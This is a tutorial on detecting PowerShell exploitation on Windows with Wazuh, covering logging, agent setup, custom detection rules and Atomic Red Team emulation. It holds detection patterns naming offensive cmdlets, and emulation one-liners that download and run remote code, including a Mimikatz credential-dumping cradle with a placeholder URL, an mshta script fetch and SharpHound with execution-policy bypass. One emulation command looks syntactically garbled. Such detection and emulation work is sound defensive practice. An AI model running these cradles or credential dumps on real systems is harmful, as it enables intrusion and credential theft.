# Detecting PowerShell Exploitation Techniques in Windows Using Wazuh

This guide provides a step-by-step approach to detecting PowerShell exploitation techniques on Windows systems using Wazuh. It includes enabling PowerShell logging, configuring Wazuh agents, and creating custom detection rules.

---

## 1. Enabling PowerShell Logging

PowerShell does not collect detailed information about executed commands by default due to the associated system resource and storage demands. To enable comprehensive logging, follow these steps:

### Step 1: Enable PowerShell Logging
Run the following commands as an Administrator in PowerShell:

```powershell
function Enable-PSLogging {
    # Define registry paths for ScriptBlockLogging and ModuleLogging
    $scriptBlockPath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
    $moduleLoggingPath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
    
    # Enable Script Block Logging
    if (-not (Test-Path $scriptBlockPath)) {
        $null = New-Item $scriptBlockPath -Force
    }
    Set-ItemProperty -Path $scriptBlockPath -Name EnableScriptBlockLogging -Value 1

    # Enable Module Logging
    if (-not (Test-Path $moduleLoggingPath)) {
        $null = New-Item $moduleLoggingPath -Force
    }
    Set-ItemProperty -Path $moduleLoggingPath -Name EnableModuleLogging -Value 1
    
    # Specify modules to log - set to all (*) for comprehensive logging
    $moduleNames = @('*')  # To specify individual modules, replace * with module names in the array
    New-ItemProperty -Path $moduleLoggingPath -Name ModuleNames -PropertyType MultiString -Value $moduleNames -Force

    Write-Output "Script Block Logging and Module Logging have been enabled."
}

Enable-PSLogging
```
> Output
> Script Block Logging and Module Logging have been enabled.
---

## 2. Configuring the Wazuh Agent

Modify the Wazuh agent configuration to forward PowerShell logs to the Wazuh server for analysis.

### Step 1: Update the Configuration File
Add the following configuration to the `<ossec_config>` block of the `ossec.conf` file located at `C:\Program Files (x86)\ossec-agent`:

```ps
notepad.exe 'C:\Program Files (x86)\ossec-agent\ossec.conf'
```
```xml
<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

### Step 2: Restart the Wazuh Agent
Apply the changes by restarting the Wazuh agent:

```powershell
Restart-Service -Name wazuh
```

---

## 3. Creating Custom Detection Rules on the Wazuh Server

Custom rules help identify and respond to potential exploitation attempts. Perform the following steps on the Wazuh server:

### Step 1: Add Custom Rules
Insert the following rules into the `/var/ossec/etc/rules/local_rules.xml` file:

```sh
sudo nano /var/ossec/etc/rules/local_rules.xml
```
```xml
<group name="windows,powershell,">

  <rule id="100201" level="8">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.payload" type="pcre2">(?i)CommandInvocation</field>
    <field name="win.system.message" type="pcre2">(?i)EncodedCommand|FromBase64String|EncodedArguments|-e\b|-enco\b|-en\b</field>
    <description>Encoded command executed via PowerShell.</description>
    <mitre>
      <id>T1059.001</id>
      <id>T1562.001</id>
    </mitre>
  </rule>
  
  <rule id="100202" level="4">
    <if_sid>60009</if_sid>
    <field name="win.system.message" type="pcre2">(?i)blocked by your antivirus software</field>
    <description>Windows Security blocked malicious command executed via PowerShell.</description>
    <mitre>
      <id>T1059.001</id>  
    </mitre>
  </rule>

  <rule id="100203" level="10">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.payload" type="pcre2">(?i)CommandInvocation</field>    
    <field name="win.system.message" type="pcre2">(?i)Add-Persistence|Find-AVSignature|Get-GPPAutologon|Get-GPPPassword|Get-HttpStatus|Get-Keystrokes|Get-SecurityPackages|Get-TimedScreenshot|Get-VaultCredential|Get-VolumeShadowCopy|Install-SSP|Invoke-CredentialInjection|Invoke-DllInjection|Invoke-Mimikatz|Invoke-NinjaCopy|Invoke-Portscan|Invoke-ReflectivePEInjection|Invoke-ReverseDnsLookup|Invoke-Shellcode|Invoke-TokenManipulation|Invoke-WmiCommand|Mount-VolumeShadowCopy|New-ElevatedPersistenceOption|New-UserPersistenceOption|New-VolumeShadowCopy|Out-CompressedDll|Out-EncodedCommand|Out-EncryptedScript|Out-Minidump|PowerUp|PowerView|Remove-Comments|Remove-VolumeShadowCopy|Set-CriticalProcess|Set-MasterBootRecord</field>
    <description>Risky CMDLet executed. Possible malicious activity detected.</description>
    <mitre>
      <id>T1059.001</id>  
    </mitre>
  </rule>

  <rule id="100204" level="8">
    <if_sid>91802</if_sid>
    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)mshta.*GetObject|mshta.*new ActiveXObject</field>
    <description>Mshta used to download a file. Possible malicious activity detected.</description>
    <mitre>
      <id>T1059.001</id>  
    </mitre>
  </rule>

  <rule id="100205" level="5">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.contextInfo" type="pcre2">(?i)ExecutionPolicy bypass|exec bypass</field>
    <description>PowerShell execution policy set to bypass.</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <rule id="100206" level="5">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.contextInfo" type="pcre2">(?i)Invoke-WebRequest|IWR.*-url|IWR.*-InFile</field>
    <description>Invoke Webrequest executed, possible download cradle detected.</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

</group>
```

#### Rule Summary:
- **Rule ID 100201:** Detects encoded commands executed via PowerShell.
- **Rule ID 100202:** Alerts when malicious commands are blocked by Windows Security.
- **Rule ID 100203:** Identifies known malicious cmdlets or risky commands.
- **Rule ID 100204:** Detects the use of `mshta` for file downloads.
- **Rule ID 100205:** Detects scripts executed with the execution policy set to bypass.
- **Rule ID 100206:** Identifies potential download cradles using `Invoke-WebRequest`.

### Step 2: Restart the Wazuh Manager
Apply the new rules by restarting the Wazuh manager:

```bash
systemctl restart wazuh-manager
```

### Attack emulation
1.
```ps
curl "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1" -o SharpHound.ps1
powershell -ep bypass .\sharphound.ps1 --collectionmethod all
```
2.
```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
```
3.
```
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('https://secure.eicar.org/eicar.com.txt -OutFile eicar;.\eicar')"
```
4.
```
Invoke-WebRequest https://secure.eicar.org/eicar.com.txt -OutFile eicar;.\eicar
```

### Obfuscation and evasion

Run the below command to execute an encoded command using the EncodedCommand flag. This sample command prints Hello World to the screen:
```
powershell.exe -EncodedCommand "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAgAFcAbwByAGwAZAAiAA=="
```

Threat actors may also use PowerShellâ€™s execution policy bypass for malicious purposes and execute unauthorized scripts. By leveraging the -ExecutionPolicy Bypass flag (or any of its variants like exec bypass), attackers can override restrictions that prevent script execution, enabling them to deploy malicious payloads. This method allows unsigned or restricted scripts to run successfully on the endpoint.

Run the commands below to simulate a threat actor using execution bypass to run scripts:
```
echo "whoami" > "C:\Program Files (x86)\ossec-agent\active-response\bin\test.ps1"
Powershell -ExecutionPolicy bypass -File "C:\Program Files (x86)\ossec-agent\active-response\bin\test.ps1"
```
### Living off the land
```
mshta.exe "javascript:a=GetObject('script:#{url}').Exec();close()"
```

---
> Note: First install Sysmon on the endpoint, then proceed with Atomic Red Team installation.

### Atomic Red Team installation

Perform the following steps to install the Atomic Red Team PowerShell module on a Windows 11 endpoint using PowerShell as an administrator.

By default, PowerShell restricts the execution of running scripts. Run the command below to change the default execution policy to RemoteSigned:
```
Set-ExecutionPolicy RemoteSigned
```
Install the ART execution framework:
```
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics
```

Import the ART module to use Invoke-AtomicTest function:

```
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

Use Invoke-AtomicTest function to show details of the technique T1218.010:

```
Invoke-AtomicTest T1218.010 -ShowDetailsBrief
```
> Output
>
> PathToAtomicsFolder = C:\AtomicRedTeam\atomics
>
> T1218.010-1 Regsvr32 local COM scriptlet execution
>
> T1218.010-2 Regsvr32 remote COM scriptlet execution
>
> T1218.010-3 Regsvr32 local DLL execution
>
> T1218.010-4 Regsvr32 Registering Non DLL
>
> T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer

Check/Get prerequisites of a technique
To check the prerequisites needed to test T1548.002, the command below is used:
```
Invoke-AtomicTest T1548.002 -CheckPrereqs
```
> Outpust
> CheckPrereq's for: T1548.002-10 UACME Bypass Method 23
> Prerequisites met: T1548.002-10 UACME Bypass Method 23
> CheckPrereq's for: T1548.002-11 UACME Bypass Method 31
> Prerequisites met: T1548.002-11 UACME Bypass Method 31
> CheckPrereq's for: T1548.002-12 UACME Bypass Method 33
> Prerequisites met: T1548.002-12 UACME Bypass Method 33
> CheckPrereq's for: T1548.002-13 UACME Bypass Method 34
> Prerequisites met: T1548.002-13 UACME Bypass Method 34
> CheckPrereq's for: T1548.002-14 UACME Bypass Method 39
> Prerequisites met: T1548.002-14 UACME Bypass Method 39
> CheckPrereq's for: T1548.002-15 UACME Bypass Method 56
> Prerequisites met: T1548.002-15 UACME Bypass Method 56
> CheckPrereq's for: T1548.002-16 UACME Bypass Method 59
> Prerequisites not met: T1548.002-16 UACME Bypass Method 59
> [*] UACME executable must exist on disk at specified location (%temp%\uacme\59 Akagi64.exe)
>
> Try installing prereq's with the -GetPrereqs switch
> CheckPrereq's for: T1548.002-17 UACME Bypass Method 61
> Prerequisites not met: T1548.002-17 UACME Bypass Method 61
> [*] UACME executable must exist on disk at specified location (%temp%\uacme\61 Akagi64.exe)
>
> Try installing prereq's with the -GetPrereqs switch.

To apply changes, we restart the agent by running the following PowerShell command as an administrator:
```
Restart-Service -Name wazuh
```
## Wazuh Server Confi
#### Creating detection rules
```
sudo nano /var/ossec/etc/rules/local_rules.xml
```
Add rules
```xml
<group name="windows,sysmon,">

<rule id="115001" level="10">
  <if_group>windows</if_group>
  <field name="win.eventdata.ruleName" type="pcre2" >technique_id=T1053,technique_name=Scheduled Task</field>
  <description>A Newly Scheduled Task has been Detected on $(win.system.computer)</description>
  <mitre>
    <id>T1053</id>
  </mitre>
</rule>

<rule id="115002" level="10">
  <if_group>windows</if_group>
  <field name="win.eventdata.ruleName" type="pcre2" >technique_id=T1073,technique_name=DLL Side-Loading</field>
  <description>DLL Side-Loading Detected on $(win.system.computer)</description>
  <mitre>
    <id>T1073</id>
    <id>T1574.002</id>
  </mitre>
</rule>

<rule id="115003" level="10">
  <if_group>windows</if_group>
  <field name="win.eventdata.ruleName" type="pcre2" >technique_id=T1218.010,technique_name=Regsvr32</field>
  <description>Signed Binary Proxy Execution using Regsvr32 Detected on $(win.system.computer)</description>
  <mitre>
    <id>T1218</id>
    <id>T1117</id>
  </mitre>
</rule>

<rule id="115004" level="10">
  <if_group>windows</if_group>
  <field name="win.eventdata.ruleName" type="pcre2" >technique_id=T1518.001,technique_name=Security Software Discovery</field>
  <description>Security Software Discovery Attempt has been Detected on $(win.system.computer)</description>
  <mitre>
    <id>T1518</id>
  </mitre>
</rule>

<rule id="115005" level="10">
  <if_group>windows</if_group>
  <field name="win.eventdata.ruleName" type="pcre2" >technique_id=T1548.002,technique_name=Bypass User Access Control</field>
  <description>Privilege Escalation Through Bypass of UAC has been Detected on $(win.system.computer)</description>
  <mitre>
    <id>T1548.002</id>
    <id>T1088</id>
  </mitre>
</rule>

</group>
```
We restart the Wazuh manager so it starts using the new rules:
```
systemctl restart wazuh-manager
```
Attack emulation

Emulate the signed binary proxy execution technique on the Windows 11 endpoint.

Run the command below with Powershell as an administrator to perform the T1218.010 test:
```
Invoke-AtomicTest T1218.010
```
> Output
>
> PathToAtomicsFolder = C:\AtomicRedTeam\atomics
>
> Executing test: T1218.010-1 Regsvr32 local COM scriptlet execution
>
> Done executing test: T1218.010-1 Regsvr32 local COM scriptlet execution
>
> Executing test: T1218.010-2 Regsvr32 remote COM scriptlet execution
>
> Done executing test: T1218.010-2 Regsvr32 remote COM scriptlet execution
>
> Executing test: T1218.010-3 Regsvr32 local DLL execution
>
> Done executing test: T1218.010-3 Regsvr32 local DLL execution
>
> Executing test: T1218.010-4 Regsvr32 Registering Non DLL
>
> Done executing test: T1218.010-4 Regsvr32 Registering Non DLL
>
> Executing test: T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer
>
> Done executing test: T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer

Several calculator instances will pop up after a successful execution of the exploit.

### Wazuh dashboard

Use the Wazuh archives to query and display events related to the technique being hunted. It's important to note that while consulting the archives, some events might already be captured as alerts on the Wazuh dashboard. You can use information from the Wazuh archives, including alerts and events that have no detection to create custom rules based on your specific requirements.

Apply a time range filter to view events that occurred within the last five minutes of when the test was performed. Filter to view logs from the specific Windows endpoint using `agent.id`, `agent.ip` or `agent.name`.
